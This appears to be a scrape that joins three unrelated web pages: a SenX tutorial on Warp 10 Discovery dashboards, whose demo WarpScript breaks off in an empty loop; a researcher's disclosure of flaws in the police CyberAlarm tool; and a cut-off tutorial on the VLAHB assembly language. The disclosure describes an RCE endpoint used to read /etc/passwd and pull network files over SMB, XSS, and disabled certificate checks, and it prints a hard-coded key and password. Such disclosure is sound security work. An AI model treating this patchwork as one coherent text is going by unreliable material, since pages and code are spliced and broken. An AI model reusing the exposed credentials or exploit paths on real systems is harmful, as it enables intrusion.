<p>Despite some efforts to create alternative tools or services, <a href="https://en.wikipedia.org/wiki/Grafana" target="_blank" rel="noreferrer noopener">Grafana</a> remains the number one choice for many to create dashboards. Sure Grafana is great. It can connect to many data sources, has some nice themes and widgets. And it has a visual interface for building dashboards that appeals to newcomers. </p>



<p>But once you get into some serious monitoring and want to build complex dashboards, the visual interface you used to love quickly becomes the one you start hating. Indeed it is long and tedious to create large dashboards this way and impossible to create what we call dynamic dashboards.</p>



<h2>What are dynamic dashboards ?</h2>



<p>For some, dynamic dashboards are the ones that periodically update with recent data. For others, they are dashboards which can display information about a variable number of systems based on parameters that are chosen dynamically by the viewer. Though there is indeed a dynamic nature to those dashboards it is really light.</p>



<p><strong>What we call dynamic dashboards are dashboards whose content can completely change depending on the actual context.</strong> Instead of always showing the same graphs, dynamic dashboards will display contextual information that will immediately catch your attention. </p>



<p>Imagine for example a dashboard showing the current trend for a system. It will display the last hour of data and will rely on you to spot the anomalies. A dynamic dashboard on the other hand would also display the last hour as the standard dashboard. But upon detecting a specific situation it would additionally display graphs for other systems, the list of alerts which were triggered, links to knowledge base articles related to the nature of the current incident, and a status of possibly impacted systems, all on the same screen.</p>



<p><strong>Building such dashboards using a tool like Grafana is impossible</strong>. You would probably need to build a full-fledged application that may redirect to different Grafana dashboard URLs depending on the context. Not the most efficient way to go...</p>



<h2>Introducing Discovery</h2>



<p>At <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> we strongly believed that there was a better way and we proved it with the creation of <em>Discovery</em>.</p>



<p>Discovery is SenX's dashboarding solution for the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> Time Series Platform. <strong>What makes Discovery unique is its <em>Dashboards as Code</em> approach.</strong> </p>



<p>With Discovery, creating dashboards is simply a matter of using a specific macro in your <a href="https://www.warp10.io/content/03_Documentation/04_WarpScript" target="_blank" rel="noreferrer noopener">WarpScript</a> or <a href="https://blog.senx.io/introducing-flows/" target="_blank" rel="noreferrer noopener">FLoWS</a> code.</p>



<p>The macro expects a list of <em>tile</em> descriptions and an optional set of global parameters. It will produce an HTML rendering of your dashboard, complete with auto-refresh capabilities.</p>



<p>Coupled with the <a href="https://blog.senx.io/http-plugin/" target="_blank" rel="noreferrer noopener">HTTP Plugin</a>, you can serve those dashboards directly from your Warp 10 instance, avoiding the need to deploy and operate additional tools such as Grafana and therefore keeping your cloud bill under more control.</p>



<p>And since your dashboards are now pieces of code, you can use git to manage them and track changes. No more bad surprises after a colleague changed the style or the layout of important dashboards because s/he thought the change was only local... I'm sure you have experienced this before!</p>



<h2>Discovery in practice</h2>



<p>Putting Discovery to work is very simple. You should have your first dashboard available minutes after you start.</p>



<h3>Configuring the HTTP Plugin</h3>



<p>The first step to use Discovery is to configure the HTTP Plugin in your Warp 10 instance. To do this, add the following lines to a configuration file and restarting the instance:</p>



<pre><code># Load the HTTP Plugin
warp10.plugin.http = io.warp10.plugins.http.HTTPWarp10Plugin
# Define the directory where endpoint spec files will reside
http.dir = /path/to/http.dir
# Define the host and port the plugin should bind to
http.host = 127.0.0.1
http.port = 12345
# Expose the Directory and Store so FETCH requests can be performed via the plugin
egress.clients.expose = true</code></pre>



<p>The next step is to create a <code>discovery.mc2</code> endpoint specification file for the HTTP Plugin. Create this file in the <code>http.dir</code> directory defined above with the following content:</p>



<pre><code>{
  'path' '/discovery/'
 &nbsp;'prefix' true
 &nbsp;'parsePayload' true
 &nbsp;'macro' &lt;%
 &nbsp;&nbsp; 'prefix/dashboard/' @senx/discovery/dispatcher
 &nbsp;%&gt;
} </code></pre>



<p>This specification defines the handling of requests to the HTTP Plugin for URLs starting with <code>/discovery/</code>. Requests for <code>/discovery/foo/bar</code> will invoke the macro <code>@prefix/dashboard/foo/bar</code>. The macro will be called with the <code>request</code> object from the HTTP Plugin and is expected to return the HTML content of your dashboard, more on this later.</p>



<p>The dispatching of requests is ensured by the macro <code>@senx/discovery/dispatcher</code>. This macro is available on SenX' WarpFleet macro repository which is configured by default in the Warp 10 distribution via the line:</p>



<pre><code>warpfleet.macros.repos = https://warpfleet.senx.io/macros</code></pre>



<p>If you would rather host the macro locally, you can <a href="https://warpfleet.senx.io/macros/senx/discovery/dispatcher.mc2" target="_blank" rel="noreferrer noopener">download </a>it and save it under <code>senx/discovery/dispatcher.mc2</code> in your instance local macro repository.</p>



<h3>Creating dashboards</h3>



<p>The second and final step is to create macros for each of your dashboards. If you have configured the plugin as above, those macros should be in the subdirectory <code>prefix/dashboard</code> of the macro repository of your Warp 10 instance.</p>



<p>Dashboard macros are pretty simple. They define tiles which compose your dashboard and call a macro that renders those tiles as HTML. This macro and a set of side macros are also available on SenX' WarpFleet macro repository. In case you want to deploy them locally, download the following files:</p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/render.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/render.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/tile.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/tile.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/layout.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/layout.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/html.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/html.mc2</a></code></p>



<p>and deploy them in subdirectory <code>senx/discovery</code> of your Warp 10 instance macro repository (configured via <code>warpscript.repository.directory</code>).</p>



<p>The <code>@senx/discovery/render</code> macro expects a map as input with the following entries:</p>



<pre><code> {
 &nbsp; &nbsp; 'title' 'My Dashboard'
 &nbsp; &nbsp; 'description' 'My tremendous dashboard'
 &nbsp; &nbsp; 'tiles' [ ... ]
 &nbsp; &nbsp; // Custom CSS styles
 &nbsp; &nbsp; 'styles' '&lt;style&gt; body { background: pink; }&lt;/style&gt;'
 &nbsp; &nbsp; // Custom HTML Header
 &nbsp; &nbsp; 'header' '&lt;div&gt;&lt;img src="myLogo.png"&gt;&lt;/div&gt;'
 &nbsp; &nbsp; // Custom HTML Footer
 &nbsp; &nbsp; 'footer' '&lt;p&gt;Copyright SenX.io&lt;/p&gt;'
 &nbsp; &nbsp; 'cols' &nbsp; 12 &nbsp; &nbsp; // Number of columns of the grid, default is 12
 &nbsp; &nbsp; 'height' 220&nbsp; &nbsp; // Row height in pixels, 220 by default
 &nbsp; &nbsp; 'template' '...' &nbsp; // Custom HTML template
 } </code></pre>



<p>The only mandatory element is <code>tiles</code> which must be associated with a list of tile descriptions. Each tile description if a map with the following elements:</p>



<pre><code>{
 'title' 'Title of the tile' // optional
 'x' 0 // Horizontal position in the grid, between 0 and grid width - optional, defaults to 0.
 'y' 0 // Vertical position in the grid - optional, defaults to 0.
 'w' 1 // Width of the tile in number of grid columns - optional, defaults to 1.
 'h' 1 // Height of the tile in number of grid rows - optional, defaults to 1.
 'options' {} // WarpView specific options - optional (!).
 'type' 'plot' // Type of WarpView tile - optional, defaults to `plot`.
 'endpoint' 'https://sandbox.senx.io/api/v0/exec' // Warp 10 `/api/v0/exec` url - mandatory when 'macro' is set.
 'macro' &lt;% ... %&gt; // WarpScript macro to run to produce data for the tile - use only if 'data' is not set.
 'data' ... // Data to represent in the tile resulting from a WarpScript execution - use only if 'macro' is not set. The content type depends on the type of the tile.
}</code></pre>



<p>The types of tiles you can use are those from the <a href="https://github.com/senx/warpview/wiki" target="_blank" rel="noreferrer noopener">WarpView</a> web component library.</p>



<p>That's it! <strong>You should now be able to create your dashboards</strong>, but to make things even clearer we will walk you through an example.</p>



<h3>Demo dashboard</h3>



<p>The first step is to plan the layout of your dashboard, you can sketch it out quickly on a piece of paper:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png" alt="outline of your dashboard" width="388" height="242" srcset="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png 1024w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--300x187.png 300w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--768x478.png 768w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29-.png 1124w" sizes="(max-width: 388px) 100vw, 388px"><figcaption>Outline of our dashboard</figcaption></figure></div>



<p>Then create the macro which will define the tiles and call @senx/discovery/render to generate the HTML. In our example, the first line plot will get its data via the <code>data</code> field, the second one via a macro executed on the <a href="https://sandbox.senx.io/" target="_blank" rel="noreferrer noopener">Warp 10 Sandbox</a>.</p>



<p>The resulting WarpScript code for our dashboard is:</p>



<pre><code> &lt;%
 &nbsp; {
 &nbsp; &nbsp; 'tiles' [
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'display'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 3 'h' 1 'x' 3 'y' 0
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' 'Hello Discovery'
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 0 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' [
           NEWGTS 'data' RENAME

           FOR
         ]
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 5 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'endpoint' 'https://sandbox.senx.io/api/v0/exec'

           NEWGTS 'macro' RENAME
           0.0 'v' STORE
           1 500
           &lt;% 1 s * NOW SWAP - NaN NaN NaN $v RAND 0.5 - + DUP 'v' STORE ADDVALUE %&gt;
           FOR

<article id="5fbcefde44b88204da4fb1cc">


<figure><img src="https://paul.reviews/content/images/2020/11/cyber-alarm-1.png"></figure><p>Phew! It's been 3 long years since my last article... and I've deliberated over posting this for way too long. &nbsp;But, I feel it's important enough to warrant at least some debate.</p><p>2 months ago, I came across a tweet by Lancashire Police Fraud &amp; Cyber advertising CyberAlarm; a govt-funded tool to help protect companies from cyber attacks.</p><figure><blockquote><div lang="en" dir="ltr"><p>Police CyberAlarm helps small businesses, charities, academia and local authorities get upp-to-date knowledge of cyber attack types and trends which is an absolute key to having a robust defence. </p><p>Businesses can sign up for memeberships at <a href="https://t.co/JTFlQg7yMV">https://t.co/JTFlQg7yMV</a> 🖥️ <a href="https://t.co/bq88tsZYsa">pic.twitter.com/bq88tsZYsa</a></p></div>— Lancs Police Fraud &amp; Cyber (@LancsFraudCyber) <a href="https://twitter.com/LancsFraudCyber/status/1310535084324327425?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote>

</figure><p>Interest piqued, I signed up and awaited my "access code" which is necessary to gain access to the downloads page. Or so I thought.</p><p>A few days later, I was contacted by a Cyber Protect officer from Leicestershire Police who explained there was no download link for the "live" product on the grounds of "data confidentiality". &nbsp;I'm not sure I understand that premise, given it's a product intended for public use... but I digress. &nbsp;Instead, he provided an "installation guide" PDF which outlined how the product worked &amp; how to install it. &nbsp;If I still wanted to proceed, he could provide the access code.</p><p>Here's a segment of the installation guide...</p><figure><img src="https://paul.reviews/content/images/2020/11/1.PNG"></figure><p>--</p><p>Their installation guide suggests running it inside a DMZ (de-militarized zone, an isolated segment from other network assets) or "<strong>on your internal network</strong>".</p><p>For many firms, especially SME, the concept of running a DMZ is alien; with many network assets all joined together with no logical/physical segmentation whatsoever. &nbsp;This is crucial, as isolating potentially dangerous assets (IoT, BYOD devices etc) from your core infrastructure is vital to help prevent attacks travelling across your network.</p><p>Unfortunately, it's likely to be those smaller SMEs without a DMZ who deploy CyberAlarm; in the mistaken belief it's a safe &amp; secure way to mitigate cyber threats.</p><p>If you're going to run <em>anything </em>on your internal network, you must be able to ensure the product is reasonably secure. &nbsp;Faith-based security rarely ends well, so let's dive in.</p><h2 id="installation-">Installation:</h2><p>In the installation guide, they advise you to deploy this on a dedicated machine... which seems reasonable, until they explain why...</p><figure><img src="https://paul.reviews/content/images/2020/11/2.PNG"></figure><p>Disable SELinux?!</p><p>SELinux or "Security-Enhanced Linux" is a mandatory access control (MAC), a vital security tool built into CentOS (based on RedHat Linux). &nbsp;It's designed to protect system administrators from themselves; enforcing strict security policies and ensuring isolation between processes. &nbsp;If it's disabled, poorly-configured or malicious apps/services have root access (aka - total control) over the device.</p><p>NCSC quite rightly state "rooted/jailbroken devices are a threat to sensitive data" (<a href="https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction">https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction</a>), but NPCC are actively pushing a product which requires you to effectively root your device!</p><p>If you take NCSC's advice (and you really should!), this alone is a deal-breaker. &nbsp;The <em>only</em> reason you'd disable a vital security control is because you're too idle/inept to overcome the issue which prompted you to disable it in the first place. &nbsp;If you need further proof of this ridiculous decision, here's an article on the CentOS blog called <a href="https://blog.centos.org/2017/07/dont-turn-off-selinux/">No! Don't turn off SELinux!</a> in which Thomas Cameron, Chief Architect for Red Hat says "Linux is a gun and you know where your foot is".</p><p>Anyway...</p><p>I noticed a screenshot with the download link and without an access code or authentication, I proceeded to download the 2GB virtual machine image and launched it with VMWare Workstation.</p><h3 id="opening-pandora-s-box-">Opening Pandora's box...</h3><p>There's a lot to get through, so I'll summarise as much as possible.</p><h3 id="php-5-4">PHP 5.4</h3><figure><img src="https://paul.reviews/content/images/2020/11/5.png"></figure><p>PHP 5.4 was end of life in September 2015. &nbsp;No more security patches or updates, it's dead and should never be used in a production app. &nbsp;I'll also mention, I put this "phpinfo" file here remotely; it's not part of CyberAlarm.</p><h3 id="remote-network-access-via-rce">Remote Network Access via RCE</h3><p>This one beggars belief. &nbsp;The app has a file called "getmon.php" which literally serves as an RCE (remote command execution) endpoint.</p><figure><img src="https://paul.reviews/content/images/2020/11/4.png"></figure><p>The above image shows me grabbing /etc/passwd from the virtual machine.</p><p>That's bad enough, but what if the attacker is slightly more creative?</p><p>Here, we use the SMB protocol to <strong>connect to another PC inside the network</strong> and grab sensitive data from it.</p><figure><img src="https://paul.reviews/content/images/2020/11/3.png"></figure><p>If you have sensitive data, trade secrets or anything else important on your network, it's now remotely accessible to <em>anyone, anywhere </em>when you view a web page. &nbsp;We haven't placed anything on the network/virtual machine to achieve this either... the attacker is just carrying out commands as if they're sat inside your network.</p><p>Let me be really clear about this. &nbsp;This vulnerability allows a remote attacker to entirely bypass your firewall and exfiltrate <em>any </em>data accessible over your network; you only need to visit a vulnerable web page once.</p><h3 id="cross-site-scripting">Cross Site Scripting</h3><p>Looking through the code, there's no attempt to sanitize (or make safe) any user inputs, so an attacker can remotely inject malicious code into any page on the box. &nbsp;Here, we hijack the "registration" page.</p><figure><img src="https://paul.reviews/content/images/2020/11/6.png"></figure><h3 id="tls-certificate-expiry">TLS certificate expiry</h3><p>It should go without saying, but if your security certificate expires, it's no longer secure.</p><figure><img src="https://paul.reviews/content/images/2020/11/7.png"></figure><h3 id="broken-encryption">Broken Encryption</h3><p>The strongest of door locks is rendered insecure if you leave the key somewhere vulnerable. &nbsp;The same applies in cryptography. &nbsp;It's absolutely vital to generate a cryptographically random key and handle it securely.</p><p>Sadly, CyberAlarm does neither.</p><p>The "key" is static and hard-coded: "P3rv4d3S0ftw4r3"</p><p>Reading between the character substitution, you'll see "Pervade Software" - the developers behind CyberAlarm.</p><p>To make matters worse, they use AES-CBC, which can be implemented securely by a competent developer. &nbsp;Alas here, the weak key and complete lack of MAC (message authentication code) means they cannot trust <em>any </em>of the data they collect.</p><p>A MAC is vital; it allows the recipient to ensure the data hasn't been manipulated during transit. &nbsp;Without it, they're actioning harvested data collected from "data collectors" with <strong>absolutely no guarantee</strong> of its integrity. &nbsp;Far from improving security, I'd argue this makes matters worse. &nbsp;Your reports could be entirely fake or largely contain data you can't act upon; diverting your attention from real risks.</p><h3 id="broken-encryption-part-deux">Broken Encryption &nbsp;- Part Deux</h3><p>One sure-fire way to ensure your product is entirely insecure is to disable all security checks on your certificate, which of course, CyberAlarm does.</p><figure><img src="https://paul.reviews/content/images/2020/11/8.PNG"></figure><p>This means all updates are insecure - allowing an attacker to put <em>anything </em>on the device remotely. &nbsp;Note: I've added the comments in this screenshot to clarify what each line does.</p><h3 id="embedding-server-passwords-in-code-">Embedding server passwords in code!</h3><p>Seriously.</p><p>When the app needs to grab a list of "jobs" or tasks to carry out locally, it logs in with a password of "3jscove".</p><figure><img src="https://paul.reviews/content/images/2020/11/image.png"></figure><p>If you're wondering, the "phash" function is a wrapper for SHA-256; another insecure &amp; unsuitable choice for password hashing.</p><h2 id="insert-record-scratch-sound-here">&lt;insert record scratch sound here&gt;</h2><p>In light of all these failings, I notified Leicestershire Police and awaited their response.</p><p>When it came, I was stunned.</p><p>The link I'd "found" (from their installation guide) was a 2yr old "test" version never intended for public use! &nbsp;Great, it's 2 years old... now your dependencies are only 3 years out of date instead &lt;/sarcasm&gt;</p><p>I'm not about to disclose the entire conversation or the meetings which followed, but when the phrase "no deal breakers" was uttered, I realised this has to go public. &nbsp;In fairness, they have put me in touch with the CTO at Pervade with a view to "making the product better" but after a couple of brief conversations (none of which technical) and despite his candid response, my position now hasn't changed from day one.</p><p>This pilot should be pulled <strong>immediately</strong>. I'd actually go one step further and question how a product with so many simple but critical security flaws could ever be promoted by the Police.</p><h2 id="the-actual-live-version-">The "actual" live version...</h2><p>Following my criticisms over the "old" version, I was given an access code to allow me to download the "live" one.</p><p>Suffice to say, little has changed.</p><p>The code is still woefully insecure, as is the implementation of several core features and in all honesty, I just haven't the time nor motivation to explain why disabling security controls is a bad idea. Sorry Jon.</p><h2 id="obscurity-hides-a-thousand-sins-">Obscurity hides a thousand sins...</h2><p>What I haven't yet mentioned, is the fact that every single line of code in CyberAlarm is encoded/obfuscated using IonCube. &nbsp;By obscuring the code, it prevents any casual observer from uncovering the mess contained within.</p><figure><img src="https://paul.reviews/content/images/2020/11/10.PNG"></figure><p>Thankfully, IonCube is easily reversed (as is any encoding) and offers very little real-world protection. &nbsp;However, CyberAlarm has apparently "passed" a penetration test which, assuming it wasn't carried out by Stevie Wonder, beggars belief.</p><h2 id="summary">Summary</h2><p>CyberAlarm is sadly nothing more than an insecure, poor-designed/engineered wrapper around OpenVAS - an open-source vulnerability assessment scanner.</p><p>I appreciate the forces may disagree with my findings and/or conclusions, however whilst they don't consider any of the above to be "deal breakers", the public are now able to decide if they're willing to entrust their firms security to a product like CyberAlarm.</p><p>If you're in #infosec (even if you're not), I welcome your comments below.</p><h3 id="update-s-">Update(s)</h3><p>25/11/20 3PM: Thanks to Dave Walker on Twitter for pointing out a mistake regarding CentOS. &nbsp;My screenshots show a later build with CentOS 7 / PHP 5.4 so to avoid confusion, I've removed that section. Apologies folks.</p><p>27/11/20 17:30PM: The NPCC have <a href="https://cyberalarm.police.uk/pca-official-response/">published a response</a>, claiming this is "completely untrue". &nbsp;Needless to say, they're entirely wrong... but I've been hearing that story for 2 months. &nbsp;I'll reply here shortly, however for more immediate updates, keep your eyes peeled on <a href="https://twitter.com/paul_reviews">@paul_reviews</a> - where I've already disproven their first claim (they never provided a link to the …</p></article></div></div>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>×</b>, <b>÷</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2
ADD R[33] 1
GTE R[0] 2
ADD R[33] 1
ADD R[33] 2

EXIT
</code></pre>

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
